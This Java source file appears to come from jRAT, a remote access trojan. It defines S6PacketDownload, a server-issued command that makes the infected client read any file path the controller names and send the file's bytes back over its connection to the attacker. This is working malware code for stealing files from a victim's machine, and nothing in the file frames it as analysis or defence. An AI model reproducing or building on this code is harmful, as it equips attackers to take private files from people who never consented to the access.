package net.jrat.core.packet.server;

import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;

import net.jrat.core.Client;
import net.jrat.core.packet.IPacket;
import net.jrat.core.packet.client.C2PacketSaveFile;

public class S6PacketDownload implements IPacket
{
	private static final long serialVersionUID = 1L;
	
	private String filepath;
	private String outputpath;
	
	@Override
	public void execute(Object object) throws Exception
	{
		final File file = new File(this.filepath);
		
		if(file.exists())
		{
			final BufferedInputStream reader = new BufferedInputStream(new FileInputStream(file));
			
			final ByteArrayOutputStream writer = new ByteArrayOutputStream();
			final byte[] bytes = new byte[(int) file.length()];
			
			int read;
			while(!((read = reader.read(bytes)) == -1))
				writer.write(bytes, 0, read);
			reader.close();
			
			Client.instance.outputStream.writeObject(new C2PacketSaveFile(writer.toByteArray(), this.outputpath));
			writer.close();
		}
	}
}